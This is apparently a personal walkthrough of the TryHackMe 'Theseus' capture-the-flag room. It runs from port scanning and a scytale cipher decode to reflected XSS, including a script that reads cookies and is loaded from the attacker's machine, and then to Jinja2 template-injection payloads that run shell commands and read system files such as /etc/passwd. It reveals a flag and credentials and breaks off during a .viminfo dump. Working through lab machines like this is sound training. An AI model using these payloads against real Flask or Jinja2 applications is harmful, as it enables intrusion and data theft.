----
The first installment of the SuitGuy series of very hard challenges.
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/9c87676bf415d0fa4f7dfad790b8ba51.jpeg)

### Task 1  Theseus

 Start Machine

Can you follow the path of Theseus and survive the trials of the Labyrinth?  
  
Please don't release any walk-through or write-ups for this room to keep the challenge valuable for all who complete the Labyrinth.

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ ping 10.10.57.61            
PING 10.10.57.61 (10.10.57.61) 56(84) bytes of data.
64 bytes from 10.10.57.61: icmp_seq=1 ttl=63 time=193 ms
64 bytes from 10.10.57.61: icmp_seq=2 ttl=63 time=187 ms
^C
--- 10.10.57.61 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 187.194/190.193/193.193/2.999 ms
                                                                                                                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.57.61 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.57.61:22
Open 10.10.57.61:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 21:34 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:34
Completed Parallel DNS resolution of 1 host. at 21:34, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:34
Scanning 10.10.57.61 [2 ports]
Discovered open port 22/tcp on 10.10.57.61
Discovered open port 8080/tcp on 10.10.57.61
Completed Connect Scan at 21:34, 0.19s elapsed (2 total ports)
Initiating Service scan at 21:34
Scanning 2 services on 10.10.57.61
Completed Service scan at 21:34, 6.41s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.57.61.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 5.59s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.75s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
Nmap scan report for 10.10.57.61
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-01 21:34:46 EDT for 13s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87c426884f42ae2c748bff662df0689d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCz+HeNp9l/BIOcQooT/LeuPI0QdNtru49hzUMhdEZDwSMxsx6Ppjz62eLWn7kxziSQN1SjzfP9/FiEfT/8JiORFO5Lcqpd7NTTmNykKImIeCYbNQglFn4oXJA/YU6PCMLXlqV7JIUHKwyobAz36wlrnAC6ngTrzwhkv4mdiFwKtLtRD5bimyO7PIRKy8Diu/Bwm85AmXEet+jCw2D+Mh8mdzAVZ9TgChsld5l9MqtKzjV+Rh2qzL2RfXl6EcVObSOTeXcXL9qbTNp6zIyuILOyHmVg9fFeUWHlkT0kpOXNkJSw4OV2ewzx+m2j7Kd/LW7L6EV8WuoCIhUHL+KxtxO7
|   256 05f506fcdc86f8f2bae2eedf14c33de4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIkRuZaOKjEeXbbFf0lK9iGbg2r2Kh2TVAYuPZlrwpAyuA1x7TW2z/CWVR1ug1qQ716dQq3JszyliVP3mc4lD9o=
|   256 9274cb39e1ce3190139d4cee27f806bc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK2IMzlmBlnHUMxet+ujPGmrV/I0eISqyTR5seIZrzBk
8080/tcp open  http    syn-ack Werkzeug httpd 1.0.1 (Python 2.7.17)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:34
Completed NSE at 21:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.60 seconds

http://10.10.57.61:8080/

On the bottom of the letter was a message Theseus didn't
		quite understand: 
	        TGUE?O·S·K·MTUEGI·SYENFE·TOI···SRO·T·SF·OYT···O·T·KUMH·I·AE·NMK··	

https://www.dcode.fr/scytale-cipher

TO·GET·TO·KING·MINOS·YOU·MUST·FIRST·MAKE·USE·OF·THE·?KEY·········

┌──(witty㉿kali)-[~/Downloads]
└─$ arjun -u http://10.10.238.128:8080
    _
   /_| _ '
  (  |/ /(//) v2.2.1
      _/      

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] parameter detected: key, based on: body length
[+] Parameters found: key


http://10.10.238.128:8080/?key=hi

http://10.10.238.128:8080/?key=%3Cscript%3Ealert(window.origin)%3C/script%3E

http://10.10.238.128:8080/?key=%3Cscript%3Ealert(document.domain.concat(%22\n%22).concat(window.origin))%3C/script%3E

┌──(witty㉿kali)-[~]
└─$ cat xss.js                                        
var req = new XMLHttpRequest();
req.open("GET", "http://10.10.238.128:8080/?key=" + document.cookie, false);
req.send();

http://10.10.238.128:8080/?key=%3Cscript%20src=%22http://10.8.19.103/xss.js%22%3E%3C/script%3E

┌──(witty㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.8.19.103 - - [02/Jul/2023 12:40:50] "GET /xss.js HTTP/1.1" 200 -

http://10.10.238.128:8080/?key=%3Cscript%3Edebugger;%3C/script%3E

is SSTI (I thought SSRF)

http://10.10.238.128:8080/?key={{7*7}}

49

http://10.10.238.128:8080/?key={{config.items()}}

[('JSON_AS_ASCII', True), ('USE_X_SENDFILE', False), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_NAME', 'session'), ('MAX_COOKIE_SIZE', 4093), ('SESSION_COOKIE_SAMESITE', None), ('PROPAGATE_EXCEPTIONS', None), ('ENV', 'production'), ('DEBUG', False), ('SECRET_KEY', None), ('EXPLAIN_TEMPLATE_LOADING', False), ('MAX_CONTENT_LENGTH', None), ('APPLICATION_ROOT', '/'), ('SERVER_NAME', None), ('PREFERRED_URL_SCHEME', 'http'), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('TESTING', False), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)), ('TEMPLATES_AUTO_RELOAD', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('JSON_SORT_KEYS', True), ('JSONIFY_MIMETYPE', 'application/json'), ('SESSION_COOKIE_HTTPONLY', True), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(0, 43200)), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('TRAP_HTTP_EXCEPTIONS', False)]

http://10.10.238.128:8080/?key={{%20%27%27.__class__.__mro__[2].__subclasses__()%20}}

[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'string.Template'>, <class 'string.Formatter'>, <type 'collections.deque'>, <type 'deque_iterator'>, <type 'deque_reverse_iterator'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'itertools.combinations'>, <type 'itertools.combinations_with_replacement'>, <type 'itertools.cycle'>, <type 'itertools.dropwhile'>, <type 'itertools.takewhile'>, <type 'itertools.islice'>, <type 'itertools.starmap'>, <type 'itertools.imap'>, <type 'itertools.chain'>, <type 'itertools.compress'>, <type 'itertools.ifilter'>, <type 'itertools.ifilterfalse'>, <type 'itertools.count'>, <type 'itertools.izip'>, <type 'itertools.izip_longest'>, <type 'itertools.permutations'>, <type 'itertools.product'>, <type 'itertools.repeat'>, <type 'itertools.groupby'>, <type 'itertools.tee_dataobject'>, <type 'itertools.tee'>, <type 'itertools._grouper'>, <type '_thread._localdummy'>, <type 'thread._local'>, <type 'thread.lock'>, <type 'method_descriptor'>, <class 'markupsafe._MarkupEscapeHelper'>, <type '_io._IOBase'>, <type '_io.IncrementalNewlineDecoder'>, <type '_hashlib.HASH'>, <type '_random.Random'>, <type 'cStringIO.StringO'>, <type 'cStringIO.StringI'>, <type 'cPickle.Unpickler'>, <type 'cPickle.Pickler'>, <type 'functools.partial'>, <type '_ssl._SSLContext'>, <type '_ssl._SSLSocket'>, <class 'socket._closedsocket'>, <type '_socket.socket'>, <class 'socket._socketobject'>, <class 'socket._fileobject'>, <type 'time.struct_time'>, <type 'Struct'>, <class 'urlparse.ResultMixin'>, <class 'contextlib.GeneratorContextManager'>, <class 'contextlib.closing'>, <type '_json.Scanner'>, <type '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'threading._Verbose'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'numbers.Number'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'decimal.Decimal'>, <class 'decimal._ContextManager'>, <class 'decimal.Context'>, <class 'decimal._WorkRep'>, <class 'decimal._Log10Memoize'>, <type '_ast.AST'>, <class 'ast.NodeVisitor'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <type 'datetime.date'>, <type 'datetime.timedelta'>, <type 'datetime.time'>, <type 'datetime.tzinfo'>, <class 'logging.LogRecord'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.urls.Href'>, <type 'select.epoll'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.types.ParamType'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'werkzeug.serving.WSGIRequestHandler'>, <class 'werkzeug.serving._SSLContext'>, <class 'werkzeug.serving.BaseWSGIServer'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'email.LazyImporter'>, <class 'calendar.Calendar'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.wrappers.base_request.BaseRequest'>, <class 'werkzeug.wrappers.base_response.BaseResponse'>, <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 'werkzeug.wrappers.cors.CORSRequestMixin'>, <class 'werkzeug.wrappers.cors.CORSResponseMixin'>, <class 'werkzeug.useragents.UserAgentParser'>, <class 'werkzeug.useragents.UserAgent'>, <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'uuid.UUID'>, <type 'CArgObject'>, <type '_ctypes.CThunkObject'>, <type '_ctypes._CData'>, <type '_ctypes.CField'>, <type '_ctypes.DictRemover'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <class 'subprocess.Popen'>, <class 'itsdangerous._json._CompactJSON'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'flask._compat._DeprecatedBool'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'difflib.HtmlDiff'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <type 'unicodedata.UCD'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>, <type 'method-wrapper'>, <type 'array.array'>]

http://10.10.238.128:8080/?key={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()}}

uid=1001(minos) gid=1001(minos) groups=1001(minos) 

http://10.10.238.128:8080/?key={{%20%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read()%20}}

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false minos:x:1001:1001:,,,:/home/minos:/bin/bash 

http://10.10.238.128:8080/?key={{%20%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/hosts%27).read()%20}}

127.0.0.1 localhost # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters ff02::3 ip6-allhosts 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27ls%27).read()}}

bin boot dev etc home lib lib64 media mnt opt proc root run sbin snap srv sys tmp usr var 

10.10.238.128:8080/?key={{config.__class__.__init__.__globals__['os'].popen('ls /home/minos').read()}}

Crete_Shores Minos_Flag 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20/home/minos/Minos_Flag%27).read()}}

THM{499a89a2a064426921732e7d31bc08a} 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20/home/minos/Crete_Shores%27).read()}}

Theseus insisted he knew the dangers but would succeed in his journey to Crete. As the ship left the harbour wall he shouted to his father King Aegeus "and you will be proud of your son". "Then I wish you luck, my son, I shall watch for you every day. If you are successful, take down these black sails and replace them with white ones. That way I will know you are coming safe to me." As the ship docked in Crete, King Minos himself came down to inspect the prisoners from Athens. He enjoyed the chance to taunt the Athenians and to humiliate them even further. As King Minos jeered as to who would enter the labyrinth first, Theseus stepped forward. "I will go first. I am Theseus, Prince of Athens, and I do not fear what is within the walls of your maze." "Those are brave words for one so young and feeble, but the Minotaur will soon have you between its horns. Guards, open the labyrinth and let him in!" Username: entrance Password: Knossos 

 Username: entrance Password: Knossos 

uhmm not work ssh or maybe 

┌──(witty㉿kali)-[~]
└─$ ssh entrance@10.10.238.128 
entrance@10.10.238.128's password: 
Permission denied, please try again.
entrance@10.10.238.128's password: 

total 16K drwxr-xr-x 6 minos minos 13 Aug 20 2020 . drwxr-xr-x 3 minos minos 3 Aug 3 2020 .. drwxr-xr-x 5 minos minos 6 Aug 3 2020 .Website lrwxrwxrwx 1 minos minos 9 Aug 3 2020 .bash_history -> /dev/null -rw-r--r-- 1 minos minos 220 Aug 3 2020 .bash_logout -rw-r--r-- 1 minos minos 3.7K Aug 3 2020 .bashrc drwx------ 2 minos minos 3 Aug 3 2020 .cache drwx------ 3 minos minos 3 Aug 3 2020 .gnupg -rw-r--r-- 1 minos minos 807 Aug 3 2020 .profile drwx------ 2 minos minos 3 Aug 4 2020 .ssh -rw------- 1 minos minos 6.9K Aug 20 2020 .viminfo -rw-r--r-- 1 minos minos 960 Aug 20 2020 Crete_Shores -rw-r--r-- 1 minos minos 37 Aug 3 2020 Minos_Flag 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20/home/minos/.viminfo%27).read()}}

# This viminfo file was generated by Vim 8.0. # You may edit it if you're careful! # Viminfo version |1,4 # Value of 'encoding' when this file was written *encoding=utf-8 # hlsearch on (H) or off (h): ~h # Command Line History (newest to oldest): :wq |2,0,1597927386,,"wq" :q! |2,0,1596490642,,"q!" :wq! |2,0,1596490636,,"wq!" # Search String History (newest to oldest): # Expression History (newest to oldest): # Input Line History (newest to oldest): # Debug Line History (newest to oldest): # Registers: ""1 LINE 0 and let him in!" |3,1,1,1,1,0,1597927381,"and let him in!\"" "2 LINE 0 between its horns. Guards, open the labyrinth |3,0,2,1,1,0,1597927381,"between its horns. Guards, open the labyrinth" "3 LINE 0 feeble. But the Minotaur will soon have you |3,0,3,1,1,0,1597927380,"feeble. But the Minotaur will soon have you" "4 LINE 0 "Those are brave words for one so young and |3,0,4,1,1,0,1597927380,"\"Those are brave words for one so young and " "5 LINE 0 |3,0,5,1,1,0,1597927380,"" "6 LINE 0 your maze." |3,0,6,1,1,0,1597927379,"your maze.\"" "7 LINE 0 and I do not fear what is within the walls of |3,0,7,1,1,0,1597927378,"and I do not fear what is within the walls of" "8 LINE 0 "I will go first. I am Theseus, Prince of Athens, |3,0,8,1,1,0,1597927378,"\"I will go first. I am Theseus, Prince of Athens," "9 LINE 0 |3,0,9,1,1,0,1597927378,"" "- CHAR 0 |3,0,36,0,1,0,1596491094," " # File marks: '0 1 0 ~/Crete_Shores |4,48,1,0,1597927386,"~/Crete_Shores" '1 7 1 ~/.Website/templates/index.html |4,49,7,1,1597927346,"~/.Website/templates/index.html" '2 35 0 ~/.Website/templates/index.html |4,50,35,0,1596491096,"~/.Website/templates/index.html" '3 35 0 ~/.Website/templates/index.html |4,51,35,0,1596491096,"~/.Website/templates/index.html" '4 35 7 ~/.Website/templates/index.html |4,52,35,7,1596490877,"~/.Website/templates/index.html" '5 35 7 ~/.Website/templates/index.html |4,53,35,7,1596490877,"~/.Website/templates/index.html" '6 35 7 ~/.Website/templates/index.html |4,54,35,7,1596490863,"~/.Website/templates/index.html" '7 35 7 ~/.Website/templates/index.html |4,55,35,7,1596490863,"~/.Website/templates/index.html" '8 35 7 ~/.Website/templates/index.html |4,56,35,7,1596490863,"~/.Website/templates/index.html" '9 35 7 ~/.Website/templates/index.html |4,57,35,7,1596490863,"~/.Website/templates/index.html" # Jumplist (newest first): -' 1 0 ~/Crete_Shores |4,39,1,0,1597927386,"~/Crete_Shores" -' 7 1 ~/.Website/templates/index.html |4,39,7,1,1597927346,"~/.Website/templates/index.html" -' 7 1 ~/.Website/templates/index.html |4,39,7,1,1597927346,"~/.Website/templates/index.html" -' 35 0 ~/.Website/templates/index.html |4,39,35,0,1597927283,"~/.Website/templates/index.html" -' 35 0 ~/.Website/templates/index.html |4,39,35,0,1597927283,"~/.Website/templates/index.html" -' 35 0 ~/.Website/templates/index.html |4,39,35,0,1596491096,"~/.Website/templates/index.html" -' 35 0 ~/.Website/templates/index.html |4,39,35,0,1596491096,"~/.Website/templates/index.html" -' 35 7 ~/.Website/templates/index.html |4,39,35,7,1596490877,"~/.Website/templates/index.html" -' 35 7 ~/.Website/templates/index.html |4,39,35,7,1596490877,"~/.Website/templates/index.html" -' 35 7 ~/.Website/templates/index.html |4,39,35,7,1596490863,"~/.Website/templates/index.html" -' 35 7 ~/.Website/templates/index.html |4,39,35,7,1596490863,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490711,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490711,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html 